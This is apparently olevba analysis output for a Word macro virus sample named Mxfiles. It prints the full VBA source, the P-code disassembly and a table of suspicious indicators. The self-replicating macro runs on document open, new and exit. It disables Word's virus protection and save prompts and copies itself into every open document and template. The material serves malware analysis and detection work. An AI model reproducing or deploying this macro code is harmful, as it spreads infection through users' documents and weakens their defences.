olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mxfiles.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mxfiles.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mxfile.bas 
in file: ./Virus.MSWord.Mxfiles.j - OLE stream: 'Macros/VBA/Mxfile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
Mxfiles
End Sub
Sub Autoexit()
Mxfiles
End Sub
Sub Autonew()
Mxfiles
End Sub
Sub AutoOpen()
Mxfiles
End Sub
Sub Openshell()
Mxfiles
End Sub

Sub Mxfiles()
Dim txt As String, ddorg As String
Dim a As Integer, dest As String
Dim dd, dd1, dd2, ff$
Dim dayn, monthn, reg, View
Dim data As Date
txt = " åÐÇ ÇáÝíÑæÓ ÚÑÖ æÛíÑ ÖÇÑ æßá ãÇíÞæã Èå ßÊÇÈå ÚÈÇÑÉ ßáäÇ äÈÇíÚ ãÈÇÑß"
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ddorg = ThisDocument.FullName
For a = 1 To Documents.Count
If Documents.Item(a).Path <> "" Then
dest = Documents.Item(a).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(a).Name
End If
If ddorg <> dest Then
Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
If Documents.Item(a).Path <> "" Then
Documents.Item(a).Save
End If
End If
dd = Documents.Item(a).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
End If
Next a
ff$ = GetSetting(appname:="network", Section:="unix", Key:="mxfile")
If Val(ff$) = 255 Then
Application.ScreenUpdating = True
Exit Sub
End If
data = Now
dayn = Day(data)
monthn = month(data)
reg = dayn Mod monthn
If reg = 0 And dayn > 10 Then
If ActiveWindow.ActivePane.View.Type <> wdPageView Then
View = ActiveWindow.ActivePane.View.Type
ActiveWindow.ActivePane.View.Type = wdPageView
End If
 ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  'Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  'Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
ActiveWindow.ActivePane.View.Type = View
End If
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mxfiles.j
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Mxfile - 4884 bytes
' Line #0:
' 	FuncDefn (Sub toolsmacro())
' Line #1:
' 	ArgsCall Mxfiles 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub Autoexit())
' Line #4:
' 	ArgsCall Mxfiles 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub Autonew())
' Line #7:
' 	ArgsCall Mxfiles 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub AutoOpen())
' Line #10:
' 	ArgsCall Mxfiles 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub Openshell())
' Line #13:
' 	ArgsCall Mxfiles 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Sub Mxfiles())
' Line #17:
' 	Dim 
' 	VarDefn txt (As String)
' 	VarDefn ddorg (As String)
' Line #18:
' 	Dim 
' 	VarDefn a (As Integer)
' 	VarDefn dest (As String)
' Line #19:
' 	Dim 
' 	VarDefn dd
' 	VarDefn dd1
' 	VarDefn dd2
' 	VarDefn ff
' Line #20:
' 	Dim 
' 	VarDefn dayn
' 	VarDefn monthn
' 	VarDefn reg
' 	VarDefn View
' Line #21:
' 	Dim 
' 	VarDefn data (As Date)
' Line #22:
' 	LitStr 0x0044 " åÐÇ ÇáÝíÑæÓ ÚÑÖ æÛíÑ ÖÇÑ æßá ãÇíÞæã Èå ßÊÇÈå ÚÈÇÑÉ ßáäÇ äÈÇíÚ ãÈÇÑß"
' 	St txt 
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #28:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	St ddorg 
' Line #29:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #30:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #31:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	St dest 
' Line #32:
' 	Ld dest 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #33:
' 	ElseBlock 
' Line #34:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St dest 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld ddorg 
' 	Ld dest 
' 	Ne 
' 	IfBlock 
' Line #37:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dest 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd AttachedTemplate 
' 	St dd 
' Line #43:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St dd1 
' Line #44:
' 	Ld dd1 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld dd 
' 	Add 
' 	St dd2 
' Line #45:
' 	Ld dd2 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #46:
' 	Ld ddorg 
' 	Ld dd2 
' 	Ne 
' 	IfBlock 
' Line #47:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dd2 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	LitStr 0x0007 "network"
' 	ParamNamed appname 
' 	LitStr 0x0004 "unix"
' 	ParamNamed Section 
' 	LitStr 0x0006 "mxfile"
' 	ParamNamed Key 
' 	ArgsLd GetSetting 0x0003 
' 	St ff$ 
' Line #51:
' 	Ld ff$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x00FF 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #53:
' 	ExitSub 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld Now 
' 	St data 
' Line #56:
' 	Ld data 
' 	ArgsLd Day 0x0001 
' 	St dayn 
' Line #57:
' 	Ld data 
' 	ArgsLd month 0x0001 
' 	St monthn 
' Line #58:
' 	Ld dayn 
' 	Ld monthn 
' 	Mod 
' 	St reg 
' Line #59:
' 	Ld reg 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld dayn 
' 	LitDI2 0x000A 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #60:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	Ld wdPageView 
' 	Ne 
' 	IfBlock 
' Line #61:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	St View 
' Line #62:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Ld wdSeekCurrentPageHeader 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #65:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #66:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #67:
' 	QuoteRem 0x0002 0x0027 "Selection.TypeText Text:=Right(txt, 16)"
' Line #68:
' 	Ld wdSeekCurrentPageFooter 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #69:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #70:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #71:
' 	QuoteRem 0x0002 0x0027 "Selection.TypeText Text:=Right(txt, 16)"
' Line #72:
' 	Ld wdSeekMainDocument 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #73:
' 	Ld View 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #76:
' 	EndSub 
' Line #77:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

